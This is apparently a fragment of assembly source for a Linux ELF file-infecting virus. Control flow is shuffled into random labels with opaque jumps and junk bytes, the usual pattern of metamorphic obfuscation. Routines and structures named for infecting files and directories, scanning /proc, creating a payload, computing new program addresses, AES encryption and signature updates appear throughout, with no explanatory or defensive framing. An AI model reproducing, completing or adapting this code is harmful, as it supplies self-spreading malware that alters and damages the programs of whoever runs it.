    jmp         ..@aBBAekTEMCBM
..@MEwxwz2nRrGV:
    cmp         BYTE [r1], 0x39
    jb          ..@fh3JKc0dJHxK
    jae         ..@fh3JKc0dJHxK
..@UMXS9R8cRmTs:
    mov         rcx, rcx
    jmp         $+5
db 0x23, 0xb0, 0xf2
    jmp         ..@AHs6ElhyL2Im
..@4hNCUfOutU64:
    mov         BYTE [rdi], al
    jmp         $+4
db 0x03, 0x78
    jmp         $+3
db 0x39
    jmp         ..@oaxiz9P1zwMf
..@rloFCPA73NId:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+5
db 0xdd, 0xc9, 0xbe
    jmp         $+3
db 0x6c
    jb          ..@BXl611OnY5HP
    jae         ..@BXl611OnY5HP
..@hzUTBfL6UZ2i:
    mov         rbp, rbp
    jmp         ..@cbicvyoEzWq5
..@15JssrC1Co8y:
    xchg        rsi, rsi
    je          ..@iyr3zoFsbxtL
    jne         ..@iyr3zoFsbxtL
..@5mlfrWgK1dsN:
    mov         rbx, rbx
    jmp         ..@CJD8VuXV9x88
..@HN5ln5kUQGx2:
    syscall
    jmp         $+5
db 0x7a, 0xbe, 0xf9
    jmp         $+4
db 0xd8, 0x2f
    jmp         ..@70LlwRRJijRE
..@esr5FN1NZtwi:
    push        rcx
    jb          ..@F24KJGq8vHza
    jae         ..@F24KJGq8vHza
..@STrlULrqDlWP:
    xchg        rcx, rcx
    jb          ..@OS5T7Xuorw5n
    jae         ..@OS5T7Xuorw5n
..@2Xgey7eCKQII:
    jnz         ..@7RRgCKaCVt1H
    jmp         ..@ykqgrewboLKF
..@Aleknwkzn5fv:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         $+5
db 0xd0, 0x63, 0x4d
    jmp         ..@LMUfztqqxrPA
..@8yZGXh07mwDt:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+5
db 0x31, 0x7b, 0x4d
    je          ..@0VCEL6dE1qed
    jne         ..@0VCEL6dE1qed
..@7nb7ip7oyOBs:
    movzx       rax, BYTE [r2]
    jmp         $+5
db 0x20, 0xc1, 0x64
    je          ..@F4WHe5ndtSkp
    jne         ..@F4WHe5ndtSkp
..@dPseUWWiO6dp:
    mov         BYTE [r1], 0x00
    jmp         $+5
db 0x12, 0x12, 0x20
    jmp         $+5
db 0xf9, 0xc5, 0xe8
    jmp         ..@0PJdZTYW57J7
..@S8XxivekvC8L:
    mov         rsp, rsp
    jmp         $+4
db 0x89, 0x45
    jmp         FileValidation
..@tFP0gKYOwtHx:
    lea         r4, [r1]
    jmp         $+3
db 0x24
    js          ..@FZD3rwLIvZpo
    jns         ..@FZD3rwLIvZpo
..@2iXzuxkiiJN8:
    xor         r3, r3
    jmp         $+3
db 0xdd
    jb          ..@aNL4Q7MOvRCw
    jae         ..@aNL4Q7MOvRCw
..@DTHKmkkKHpY7:
    sub         rcx, rax
    jmp         $+5
db 0x62, 0x01, 0x9f
    jmp         $+4
db 0xdc, 0x1a
    jmp         $+3
db 0xe0
    jl          ..@saBJ1eU2ubEx
    jge         ..@saBJ1eU2ubEx
..@xwr7QTCP4Rzw:
    push        rdx
    js          ..@FAbHxsL40dy9
    jns         ..@FAbHxsL40dy9
..@K0ic8nwgiWYV:
    syscall
    jmp         $+4
db 0xd8, 0xb2
    jb          ..@hzUTBfL6UZ2i
    jae         ..@hzUTBfL6UZ2i
..@CT7stcqvPkv1:
    je          ..@xWucXduicjVM
    jb          ..@hLhp3hnfg3FK
    jae         ..@hLhp3hnfg3FK
..@zHkLce9OeOZP:
    push        rdi
    jmp         $+5
db 0xfb, 0xdc, 0xb8
    js          ..@DxQ4DyGxRWS4
    jns         ..@DxQ4DyGxRWS4
..@d56eFUwdwsBH:
    pop         rdi
    jmp         $+5
db 0x27, 0x71, 0xe4
    jmp         $+4
db 0x85, 0xce
    jmp         $+3
db 0x02
    jmp         $+5
db 0x82, 0x1b, 0x48
    je          ..@Oz0NXwOgZvU1
    jne         ..@Oz0NXwOgZvU1
..@SZ93ZDa3piNK:
    push        rcx
    jmp         ..@etOkvm15XSfi
..@MlCa9mMiEOdd:
    xor         r1, r1
    jmp         $+4
db 0x18, 0xb5
    jmp         ..@LmRaAsOh7F5R
..@Yg4VEKIucuL0:
    xor         rax, rax
    js          ..@epIxiRhy7aWp
    jns         ..@epIxiRhy7aWp
..@fCK7yEDIS7GN:
    xchg        rsi, rsi
    jmp         ..@6G8Y7O3m363O
..@TxEXkjJb8RZM:
    aesenc      xmm0, xmm1
    jmp         $+5
db 0x4c, 0xa2, 0xca
    jmp         $+3
db 0x73
    jmp         ..@OQxshLmTuAeK
..@1PKYVZQffaNU:
    rep         movsb
    jmp         $+3
db 0xb4
    jmp         $+5
db 0xf3, 0x69, 0xed
    jl          ..@D0UB25mv6RmH
    jge         ..@D0UB25mv6RmH
..@3ZM9iN0wySdU:
    push        rax
    jmp         $+5
db 0xa2, 0x1b, 0xc4
    jmp         $+3
db 0x8e
    jmp         $+3
db 0xe4
    jmp         ..@oCaSTgy22RjC
..@aA1EJWx1Am44:
    xchg        rdi, rdi
    jmp         ..@awsAzJ0mn4Rz
..@eqxvOBo5u1nu:
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    jl          ..@BxOFF784Apni
    jge         ..@BxOFF784Apni
..@4gvZ6aFZXg26:
    push        rdi
    jmp         $+3
db 0x8d
    jmp         $+4
db 0x1d, 0x14
    js          ..@CS5H27vmkaM2
    jns         ..@CS5H27vmkaM2
..@0zTuTEOOBQxg:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    js          ..@Qar6aoI950s4
    jns         ..@Qar6aoI950s4
..@l9NOT9BiIYDt:
    pop         rax
    jmp         $+3
db 0x1c
    js          ..@ilFi29CU6Iis
    jns         ..@ilFi29CU6Iis
..@zlf7LZvfAIHd:
    mov         rcx, m7
    jmp         $+3
db 0x7e
    jmp         ..@zpUmInMSCIWk
..@5DhsyPdhOVwO:
    je          ..@Bg9HwdZHm8uC
    jmp         $+5
db 0xc4, 0x1d, 0x5a
    jmp         $+3
db 0xee
    jb          ..@S7I7IYqi9aRE
    jae         ..@S7I7IYqi9aRE
..@vkRfskXffFwp:
    mov         r5, r3
    jmp         $+5
db 0x42, 0xbf, 0xbd
    jmp         ..@5IsBvNeIogCO
..@D8yuMlEOwyuB:
    push        rbx
    jb          ..@98nlV5woH3OZ
    jae         ..@98nlV5woH3OZ
..@VMvg5P5SsBvx:
    add         rsp, _KEYGEN_OFF_size
    jmp         $+3
db 0xb6
    jl          ..@gpjXjoJWtxxC
    jge         ..@gpjXjoJWtxxC
..@zHqDGI5Tc6ud:
    mov         r2, QWORD [r5+file.filesize]
    jmp         ..@Cp6AylOBhbG7
..@xaJv4uU02TwG:
    pop         rsi
    jl          ..@4IIqS8bguY0N
    jge         ..@4IIqS8bguY0N
..@HnstgDVHykBO:
    mov         eax, SYS_MREMAP
    jmp         $+3
db 0x57
    js          ..@JJNURWv7v9C8
    jns         ..@JJNURWv7v9C8
..@3niGQ87XSE14:
    mov         rbx, rbx
    jb          ..@1RbiSxWG3uSD
    jae         ..@1RbiSxWG3uSD
..@brf7eWKVMYEi:
    aesenclast  xmm0, xmm1
    jmp         $+5
db 0x14, 0xc1, 0xb1
    jmp         ..@ImqGRMT9lDNL
..@rgdmOvUykwjq:
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    js          ..@WIqLzPoOu7Sn
    jns         ..@WIqLzPoOu7Sn
..@fh3JKc0dJHxK:
    push        rdi
    jmp         ..@fCK7yEDIS7GN
..@dkq3FH0NbpmA:
    test        eax, eax
    jmp         $+3
db 0x96
    jmp         $+4
db 0x56, 0x10
    jmp         ..@gDemkyccZ1Ms
..@6X0IhaTVuM0H:
    pop         rbx
    jmp         ..@Sn4hGePRdkj8
..@RFEfcAp0u2dd:
    cmp         eax, 0x3
    jmp         ..@LE94SB45EOao
..@kjAkwFScldeP:
    pop         rax
    jl          ..@dht8bpIDNjlu
    jge         ..@dht8bpIDNjlu
..@yzMFIzhXnDID:
    mov         rbp, rbp
    jmp         $+5
db 0x50, 0xa5, 0x6b
    js          ..@PVDH71Ud7LDT
    jns         ..@PVDH71Ud7LDT
..@wkvoch8rIZNv:
    jmp         ..@YWaFNXEL47vZ
    jmp         $+3
db 0x93
    jmp         $+3
db 0xe6
    jmp         ..@kGw56hI4BaJP
..@6eg5pwB6kfoT:
    pop         r2
    jmp         ..@infJjc74d9YT
..@2vk0H8Zve3lK:
    rep         nop
    jmp         ..@AyonmhGxCOzf
..@mpeGTnupIFRA:
    mov         eax, SYS_LSEEK
    jmp         $+3
db 0x8f
    jmp         ..@BeNvE8ogJMGg
..@ldBEARxuLKmQ:
    mov         rsp, rsp
    jmp         $+3
db 0xa0
    jmp         $+4
db 0x2e, 0x5c
    jmp         $+3
db 0x25
    jmp         $+4
db 0xed, 0x49
    js          ..@01KmPh1pMrg4
    jns         ..@01KmPh1pMrg4
..@ceGTkUYIWaq5:
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    jmp         $+4
db 0xa8, 0xa8
    jmp         ..@dIOd4c0vrFqV
..@R0TCaKWBPapd:
    syscall
    js          ..@4kGzcPGzOGMw
    jns         ..@4kGzcPGzOGMw
..@DAIB3p4wmlJq:
    call_vsp    GetEnv
    jmp         $+3
db 0x2f
    je          ..@GHt1XsPNNxZ6
    jne         ..@GHt1XsPNNxZ6
..@DztoZifIKcyw:
    mov         ax, dx
    jmp         $+3
db 0x90
    jmp         $+4
db 0x74, 0xcd
    jmp         ..@XClPKp2f4z4R
..@0cv02zntd2mk:
    pop         r1
    jmp         ..@EAyFm2INl1HA
..@jsYmRGVdKxsp:
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    jl          ..@MM2LHbXhU6fi
    jge         ..@MM2LHbXhU6fi
..@Uc8LWyW484QH:
    mov         r4d, DWORD [r1 + file.filefd]
    jmp         $+5
db 0x82, 0x31, 0x0e
    jmp         ..@AlSZA3Mk1a7x
..@RiY2rczJlmlb:
    cmp         r1, 0x00
    jb          ..@fl80uowftETV
    jae         ..@fl80uowftETV
..@9jm2j2gnd0DF:
    mov         rcx, rcx
    jmp         $+4
db 0x5a, 0xcf
    je          ..@PZPtIhTwPm2m
    jne         ..@PZPtIhTwPm2m
..@QI9UXCR9WprD:
    push        rdx
    jl          ..@qsFlOka70fYD
    jge         ..@qsFlOka70fYD
..@ZANlewTeEjt1:
    jle         ..@4MmuqMVVmXA4
    js          ..@FDmduTYqVBJ1
    jns         ..@FDmduTYqVBJ1
..@9Q8ZQKsxxIJb:
    mov         rax, (-1)
    jmp         $+5
db 0x98, 0x8a, 0x09
    jb          ..@L7OLySj5spfG
    jae         ..@L7OLySj5spfG
..@8buWpEQywzga:
    push        0x0
    jl          ..@2Pd1Xrb1aMqu
    jge         ..@2Pd1Xrb1aMqu
..@2qI4uywzjSTo:
    push        rax
    jmp         $+4
db 0xf3, 0x8e
    jmp         $+4
db 0xd2, 0xa9
    jl          ..@HykJWkXD1tlV
    jge         ..@HykJWkXD1tlV
..@9wUqndErVEng:
    mov         rbp, rbp
    jmp         $+3
db 0x96
    jmp         ..@d5xy0QEqUwmP
..@of58j5USMrkF:
    jle         ..@YWaFNXEL47vZ
    jmp         ..@ccQcSDbx2BTx
..@YOWlxo9zjrzz:
    jmp         ..@x1eKWHumYhN8
    jmp         $+4
db 0x1a, 0xd5
    jmp         ..@xWucXduicjVM
..@IOqZOSlZDouF:
    pop         rdi
    jb          ..@yUs9PRsTSMTu
    jae         ..@yUs9PRsTSMTu
..@AmR0YJIo5ixz:
    pop         rbx
    jmp         ..@KFd8D4irXJwp
..@Hm9tHcewvGfN:
    VAR         packed, devnull
    jmp         $+3
db 0xe5
    jl          ..@pjOkE8og55RS
    jge         ..@pjOkE8og55RS
..@MM2LHbXhU6fi:
    call        UpdateSignature
    jmp         ..@9x4EqLGXEpJd
..@0DMQjmnpt9vI:
    mov         rsi, rsi
    jmp         ..@VYpQg6IBx0Kc
..@J29kLGxvQTKJ:
    push        rdx
    jmp         ..@ZQ779PTxGfnP
..@zruwkSDBzWV8:
    call_vsp    ExitProgram
    jb          ..@pNPTFSmxvxEF
    jae         ..@pNPTFSmxvxEF
..@Osm9CkThL47l:
    xchg        rcx, rcx
    jmp         ..@P1hMY8ejuA2Y
..@bcbhFFfFBbff:
    push        rbx
    jmp         ..@RbV8BkJLaCZW
..@YWaFNXEL47vZ:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@FkBsRYSx40DP
..@ewAlu9gRoyAg:
    aesenc      xmm0, xmm1
    jmp         $+4
db 0x14, 0x91
    jmp         ..@jfiIWTsK98g7
..@odQCneK6g1qc:
%ifdef X86_64
    push        rsi
%endif
    jmp         $+5
db 0xba, 0xd9, 0xb1
    jl          ..@iTOQ80ObvvjS
    jge         ..@iTOQ80ObvvjS
..@sFSEulpEpkvU:
    mov         rax, rax
    js          ..@EbCRM5r7dkZH
    jns         ..@EbCRM5r7dkZH
..@AuShr8dIGaDm:
    push        rsi
    jmp         $+4
db 0x9f, 0xc9
    jmp         $+4
db 0xe1, 0x16
    jmp         ..@pGm6xLPqlxkI
..@PGFHY8mcQVTy:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         ..@9KpPYrRW8YKs
..@OgVYnc5jyDdd:
    xchg        rax, rax
    jmp         $+5
db 0xed, 0xf6, 0x23
    js          ..@BFCQyxv6yHls
    jns         ..@BFCQyxv6yHls
..@vzyiqHqf883t:
    xchg        rsp, rsp
    jmp         $+3
db 0xb0
    jmp         ..@GbRiYMZ7gJ6Y
..@JQZ9kNnSTw9c:
    push        rdx
    jl          ..@L4EbWf3cH2wj
    jge         ..@L4EbWf3cH2wj
..@U547FsTXM2g6:
    mov         rsp, rsp
    jmp         $+3
db 0xd8
    jl          ..@Zs9MLesniwux
    jge         ..@Zs9MLesniwux
..@1uDobcxtJKOY:
    mov         rbp, [rbp]
    jmp         $+4
db 0xc1, 0xe2
    jmp         ..@hU30H1gdJ9N7
..@V0drTOq1wzvd:
    mov         rax, rax
    jmp         ..@UMXS9R8cRmTs
..@ALztnjyKjt9Q:
    mov         rbx, rbx
    jmp         ..@3u0wARKHMvVG
..@3rVUyAasntLA:
    mov         rax, rdi
    jl          ..@pqIOl8YaSwus
    jge         ..@pqIOl8YaSwus
..@NFm6gDuxAdEg:
    mov         edx, 100000000b
    jmp         $+4
db 0xc9, 0x93
    jb          ..@LluMcfq6NgJc
    jae         ..@LluMcfq6NgJc
..@z4uxkVwroyS5:
    cmp         rax, (-1)
    jmp         $+5
db 0x4d, 0xbe, 0x55
    js          ..@GWxJn2ogSgv3
    jns         ..@GWxJn2ogSgv3
..@ULCPSYKNqE5B:
    mov         eax, 0x00
    je          ..@q1LH9ZbOqT3C
    jne         ..@q1LH9ZbOqT3C
..@nmJVhBQRUtYq:
    xchg        rcx, rcx
    jmp         $+4
db 0x29, 0x54
    jmp         $+3
db 0xe4
    jmp         _eof
..@q6mMcb7jrZF0:
    pop         rcx
    jl          ..@y4jNEStpYLOP
    jge         ..@y4jNEStpYLOP
..@ux2bX1dCg2xC:
    push        rcx
    je          ..@YJklzLuKhqzC
    jne         ..@YJklzLuKhqzC
..@81MfwWTGicYL:
    pop         rax
    jmp         $+4
db 0xb2, 0x91
    je          ..@OgVYnc5jyDdd
    jne         ..@OgVYnc5jyDdd
..@GQau6urzvZZ6:
    mov         rbp, rbp
    jmp         $+4
db 0xea, 0x08
    jmp         $+5
db 0xe1, 0xf2, 0x64
    jb          ..@g83sjMZMXyH3
    jae         ..@g83sjMZMXyH3
..@FZm1bJBxD9fQ:
    jge         ..@YWaFNXEL47vZ
    jmp         $+3
db 0xd7
    jmp         ..@qXaOqOcfr05P
..@6Gk4MQVC36MR:
    VAR         packed, procdir
    jmp         $+3
db 0xb3
    jmp         $+3
db 0xa9
    jmp         $+4
db 0x9d, 0x30
    jmp         ..@nR2DVCK3v5eV
..@ZATRWTiwEkdU:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+4
db 0x2d, 0xba
    jmp         $+5
db 0xa4, 0x0d, 0xa4
    jmp         $+4
db 0x16, 0x36
    jmp         ..@O2wzmf8Lhn51
CreatePayload:
    jmp         ..@TBfsQBZNVJw2
..@Lin1T7NHUBcf:
    jmp         ..@hgDoGSPPBir0
    js          ..@QDG2S62TUpVA
    jns         ..@QDG2S62TUpVA
..@ZaVDMjyPWzVI:
    xchg        rcx, rcx
    jmp         ..@TFimRkKjlR6r
..@MMiOO4GjfdJ3:
    add         rsp, _NBF_OFF_size
    jmp         $+3
db 0x3c
    jl          ..@xKmYZ8AvSsJo
    jge         ..@xKmYZ8AvSsJo
..@gO2GCxcoU9tJ:
    pop         rbx
    jb          ..@Rm21rPbS6TyU
    jae         ..@Rm21rPbS6TyU
..@5R5JfhCgZ2de:
    xor         rax, rax
    jl          ..@dIYrmJZDGS4B
    jge         ..@dIYrmJZDGS4B
..@PPKB2T1xYwe0:
    xchg        rax, rax
    jmp         $+4
db 0x3f, 0x02
    jmp         ..@HJXbFyksaGkt
..@yoJ00vHvTzqW:
    xchg        rbx, rbx
    je          ..@TL6UVoenLSaT
    jne         ..@TL6UVoenLSaT
..@YdYl4ZWp1edx:
    cmp         DWORD [r1+1], "home"
    jb          ..@XGDAcwfcBIBU
    jae         ..@XGDAcwfcBIBU
..@XqOLHvY4dOLX:
    aesenc      xmm0, xmm1
    jb          ..@qNSxBQNuZ2RF
    jae         ..@qNSxBQNuZ2RF
..@I6m2uTSwW9Wt:
    push        rdi
    jmp         ..@ZoN1IWPQtpbu
..@FK3Nl0zg1b0X:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+5
db 0x24, 0x4c, 0x12
    jmp         $+3
db 0x52
    jmp         ..@quKPZhVzSbR3
..@bO0NnwzSCXaA:
    mov         rax, rax
    jmp         $+4
db 0x68, 0x9d
    jmp         $+5
db 0xec, 0x47, 0x90
    jmp         $+5
db 0xd6, 0x66, 0x49
    jmp         $+5
db 0x5b, 0x3f, 0x41
    je          ..@2y0YUILZkIKc
    jne         ..@2y0YUILZkIKc
..@dMK31tHFoZ1I:
    jz          ..@ZcJZqhnAUXGj
    jmp         $+3
db 0x01
    je          ..@MDjNYUeNspO8
    jne         ..@MDjNYUeNspO8
..@MyKLYT2JZmoX:
    xor         r1, r1
    jmp         $+5
db 0x99, 0x9a, 0x47
    jl          ..@2HfrhkNTbnGm
    jge         ..@2HfrhkNTbnGm
..@8bsf1jwV76H0:
    sub         al, 0x02
    jb          ..@nryZItDf9nVD
    jae         ..@nryZItDf9nVD
..@7QVGM7IqIjHw:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jl          ..@ZCHvQKyVkUk7
    jge         ..@ZCHvQKyVkUk7
..@zjxUMpRiw16C:
    mov         BYTE [rdi], al
    jmp         $+3
db 0x57
    jmp         ..@CxlvKZDdm5wR
..@rkns6YGsa73B:
    mov         r1, r5
    jmp         $+3
db 0x3a
    jmp         $+4
db 0xda, 0x9c
    jmp         ..@6xDSSx5OMyE0
..@xbTPoUvaPlM2:
    jne         ..@oVIGsxIh9dkP
    jl          ..@5u3NeQfwMFHO
    jge         ..@5u3NeQfwMFHO
..@iZ6I5qoyLJbZ:
    mov         r3, rax
    jb          ..@iMGkxgnIOSmL
    jae         ..@iMGkxgnIOSmL
..@XllbZTvVSXz4:
    sub         rsp, _PROC_OFF_size
    jmp         $+5
db 0xf9, 0x82, 0xfd
    je          ..@6Gk4MQVC36MR
    jne         ..@6Gk4MQVC36MR
GetNewProgramVaddr:
    jmp         ..@tUYJIw6d6kdf
..@lc1Kq4q2BviB:
    xor         rax, rax
    jmp         $+3
db 0x6d
    jl          ..@IeDeSkpiFFkd
    jge         ..@IeDeSkpiFFkd
..@v3WcxWTcUQGr:
    push        rax
    jmp         ..@JkTWCcCbHxju
..@1IJweaYAQGec:
    mov         rsi, rsi
    jmp         $+3
db 0xc5
    jmp         ..@lbeT4lHSxtZt
..@H4DBOXwGZ9nn:
    xchg        rdi, rdi
    jmp         $+4
db 0x00, 0xb2
    jmp         $+4
db 0xd0, 0xae
    jmp         ..@t4QRsEHomVGc
..@LrBn3Tr3FdT8:
    ret
    jb          AddSizeMappedFile
    jae         AddSizeMappedFile
..@eOEfMN4rRbxX:
    xchg        rax, rax
    js          ..@XlBMhvZCNyoO
    jns         ..@XlBMhvZCNyoO
..@XeGoQthwV6F2:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    jmp         $+4
db 0x53, 0x69
    jmp         $+3
db 0xec
    jmp         $+4
db 0x66, 0xc6
    jmp         ..@EeyaR15A5imy
..@4WBga5HnsOvq:
    mov         r1, [rsp+_NBF_OFF.file]
    js          ..@9J2ptGwlqdd7
    jns         ..@9J2ptGwlqdd7
..@xgHyUuZzscgR:
%ifdef X86_32
    pop         rbx
%endif
    jl          ..@3S7Rl1LlvMWj
    jge         ..@3S7Rl1LlvMWj
..@D9bcB22pXiSv:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
%endif
    jmp         $+3
db 0x29
    jmp         $+3
db 0x24
    je          ..@rYK0qVYX7ZAm
    jne         ..@rYK0qVYX7ZAm
..@0gd5BlxpdGiL:
    push        rdi
    jmp         ..@nwW2onYDI98v
..@nqhL3RQh3nUm:
    pop         rcx
    jmp         $+4
db 0x5c, 0x9c
    jb          ..@rPAyGxsbUHQw
    jae         ..@rPAyGxsbUHQw
..@GIQrFHBGvwHP:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    jmp         ..@WfsCIBhmiCS2
..@FwF5SJLb1jY6:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0xec, 0xd4
    js          ..@zHqDGI5Tc6ud
    jns         ..@zHqDGI5Tc6ud
..@Al5N1CbfBxZl:
    xchg        rsp, rsp
    jmp         $+5
db 0x3e, 0x52, 0x40
    jmp         $+3
db 0xbf
    jmp         ..@41TzU5jnQoEO
..@JiWtfHIsgJro:
    pop         rdx
    jb          ..@rrebUXi9WkYY
    jae         ..@rrebUXi9WkYY
..@GWoZMhVlzO7j:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         $+5
db 0x35, 0x35, 0xbd
    jl          ..@cwb9MP36p5k4
    jge         ..@cwb9MP36p5k4
..@9akrOBkamkmi:
    xchg        rdx, rdx
    jmp         ..@0eqlF4ase7zJ
..@TFimRkKjlR6r:
    pop         rbx
    jmp         $+5
db 0x83, 0x3a, 0x69
    jmp         $+4
db 0x44, 0x0e
    jmp         $+3
db 0xb6
    jmp         ..@oGVipQ9OyebK
..@owTwL8dwO1Us:
    xchg        rdx, rdx
    jmp         ..@NcUV0Jba6IoB
..@iYA2e25UVwxA:
    mov         rsp, rsp
    jl          ..@daSaZR3GGICD
    jge         ..@daSaZR3GGICD
..@Ufqk1kIdBHbz:
    cmp         BYTE [r1], 0x00
    jmp         ..@eTLTlwWbZYmY
..@3bX4PZxezNah:
    syscall
    jmp         ..@pjHkcyOJ3gDN
..@6kERAh8FNQLY:
    mov         r2, 1
    jmp         $+3
db 0xc4
    jl          ..@TzHvdUzhCE8K
    jge         ..@TzHvdUzhCE8K
..@Mnj6HFfd7BLO:
    mov         rax, 2
    jmp         $+3
db 0xee
    jmp         ..@r8ATS4IbQ4mx
..@kAQlSU4vmJlP:
    test        eax, eax
    js          ..@2Xgey7eCKQII
    jns         ..@2Xgey7eCKQII
..@2HfrhkNTbnGm:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    jmp         ..@3816vnPFkiYI
..@ggxhkkEOT2iH:
    mov         r2d, 0x2
    jb          ..@rB8JI6bT3x9a
    jae         ..@rB8JI6bT3x9a
..@bNo30zGTGv0b:
    jl          ..@1LUgCcmn0aq0
    jmp         ..@3KsZkADvrWYv
..@pXO4G5PVmTVb:
    call_vsp    Strncmp
    jmp         $+5
db 0xe1, 0x14, 0xb2
    jl          ..@MuWiGhpmcLtp
    jge         ..@MuWiGhpmcLtp
..@eWM8fDR50R6p:
    pop         rcx
    jmp         $+4
db 0x54, 0x40
    jmp         $+4
db 0x1e, 0x14
    jl          ..@rgFv7DPG1c43
    jge         ..@rgFv7DPG1c43
..@bZLFHuU7GA8g:
    jl          ..@pF4uTM3ZxXSO
    jmp         $+3
db 0x2c
    jmp         $+3
db 0x56
    jb          ..@G3yaOVoUpDNv
    jae         ..@G3yaOVoUpDNv
..@4Q7YOax0re2b:
    jmp         ..@plGLHh3U13fk
    js          ..@7N1lerTubqgK
    jns         ..@7N1lerTubqgK
..@JCbPgmJAVKqH:
    xchg        rdx, rdx
    jmp         ..@jsADnLKXdzL5
..@y9p8rji66nss:
    xchg        rsp, rsp
    jmp         ..@qaMGrJGwHbhB
..@zArXDGkyTI5j:
    xchg        rax, rax
    jmp         $+3
db 0xaf
    je          ..@CnYxte0vI4XJ
    jne         ..@CnYxte0vI4XJ
..@4BC4qO43qW2l:
    mov         rsp, rsp
    jl          ..@SGFs8leCTxGJ
    jge         ..@SGFs8leCTxGJ
..@Jxt04WsWnata:
    pop         rsi
    jmp         $+5
db 0xb5, 0x66, 0x3f
    js          ..@W42R1GHRQMwl
    jns         ..@W42R1GHRQMwl
..@Vfcn6paXslvc:
    pop         rdx
    jmp         $+5
db 0xbe, 0x9a, 0x80
    jb          ..@SgWs9aPNnISh
    jae         ..@SgWs9aPNnISh
..@4iV6zF0nw1wt:
    mov         rsp, rsp
    jmp         $+4
db 0x62, 0xd1
    jmp         $+3
db 0x42
    jb          ..@7iuHRtFuslDL
    jae         ..@7iuHRtFuslDL
..@FNhgHqJatVCN:
    pop         rbx
    jmp         ..@ADxRDt9H3gdC
..@OEP9Bx1AurjL:
    add         rdi, rax
    jmp         $+5
db 0x4d, 0x04, 0xb5
    je          ..@yvxoge0KIldv
    jne         ..@yvxoge0KIldv
..@ntc8ymaeyV9W:
%ifdef X86_32
    push        rbx
%endif
    jmp         $+5
db 0x6c, 0x03, 0x66
    jmp         $+3
db 0xa3
    jmp         $+5
db 0x84, 0x8d, 0x56
    jl          ..@XB1xk0MWH8tr
    jge         ..@XB1xk0MWH8tr
..@ieFfOyteZo2j:
    jmp         ..@d4DsYOmCqSci
    js          ..@Bg9HwdZHm8uC
    jns         ..@Bg9HwdZHm8uC
..@EwNnAlUDZsFM:
%ifdef X86_64
    push        rax
%endif
    jb          ..@9IjcCumxd4tc
    jae         ..@9IjcCumxd4tc
..@ZcJZqhnAUXGj:
    xor         rax, rax
    jmp         $+5
db 0xdf, 0xa9, 0x68
    jmp         $+5
db 0xc6, 0xa4, 0xc1
    jl          ..@SfqqkanHC6q0
    jge         ..@SfqqkanHC6q0
..@6YWPdURdmz4q:
    pop         rsi
    js          ..@KwAKdEFzxzfe
    jns         ..@KwAKdEFzxzfe
..@oc6ADRXwR4wo:
    jmp         ..@HpOSjS7dkPGz
    jb          ..@tDBRJBo27maM
    jae         ..@tDBRJBo27maM
..@1nf7yoqFUJAh:
    jz          ..@8Zx8XzpL8H3d
    js          ..@7nb7ip7oyOBs
    jns         ..@7nb7ip7oyOBs
..@6EHpFNVCbipC:
    pop         rax
    jmp         $+5
db 0x8d, 0x82, 0xf5
    jmp         $+3
db 0x5d
    jmp         ..@Xq75FYxavo8Y
..@ToBhsUIDS9h6:
    pop         rdi
    jb          ..@weJSPyX9ZxqC
    jae         ..@weJSPyX9ZxqC
..@RShH2Ni3noVY:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+3
db 0xaf
    jmp         $+3
db 0x19
    jl          ..@poKj9oSizyw1
    jge         ..@poKj9oSizyw1
..@TJ4qizaZfCnO:
    mov         rdi, r1
    jmp         ..@IWY9kHP2GvqJ
..@Fj5NRrUHwNQW:
    je          ..@hgDoGSPPBir0
    jb          ..@B1Ewv6FSxtqe
    jae         ..@B1Ewv6FSxtqe
..@Bb0EyIs9ndEo:
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    js          ..@ccZ9frYfABZW
    jns         ..@ccZ9frYfABZW
..@sMg1S8wKMNWE:
    push        rax
    jmp         $+5
db 0x1d, 0x29, 0xa0
    jmp         ..@6MQt6KNItYkD
..@vvchwBGJPcCc:
    xchg        rdi, rdi
    je          ..@7Oaac8DqZOZf
    jne         ..@7Oaac8DqZOZf
..@tYX9HrmLCJSy:
    mov         rax, rax
    jmp         ..@lshrYP0w4cLp
..@u1EYEmHdZpps:
    mov         r1, QWORD [r5+file.filesize]
    jb          ..@H4DBOXwGZ9nn
    jae         ..@H4DBOXwGZ9nn
..@aAKimYy1ypSi:
    push        rax
    js          ..@L5u133eypHqk
    jns         ..@L5u133eypHqk
..@NJKAVGidAivb:
    pop         rcx
    jmp         $+3
db 0x27
    jmp         $+5
db 0x83, 0x31, 0x3b
    jmp         $+4
db 0x2c, 0x40
    jmp         ..@HN5ln5kUQGx2
..@pGm6xLPqlxkI:
    pop         rsi
    jb          ..@CIc3EmfMg53Y
    jae         ..@CIc3EmfMg53Y
..@UNCnvhc0nTug:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    jmp         $+3
db 0x18
    jb          ..@NGZq4TTxWGWi
    jae         ..@NGZq4TTxWGWi
..@DCt5uVtTSj1y:
    push        rdx
    jmp         $+3
db 0x70
    jb          ..@Vfcn6paXslvc
    jae         ..@Vfcn6paXslvc
..@HPbXx9fj5wji:
    push        rsi
    js          ..@kCwUkoHkuoum
    jns         ..@kCwUkoHkuoum
..@3u0wARKHMvVG:
    call        Strcpy
    jmp         $+5
db 0xab, 0x1b, 0x68
    jb          ..@q4ixv4R5PQyA
    jae         ..@q4ixv4R5PQyA
